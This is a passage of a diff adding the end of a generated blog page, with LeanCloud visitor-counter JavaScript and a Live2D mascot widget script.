+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nico.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
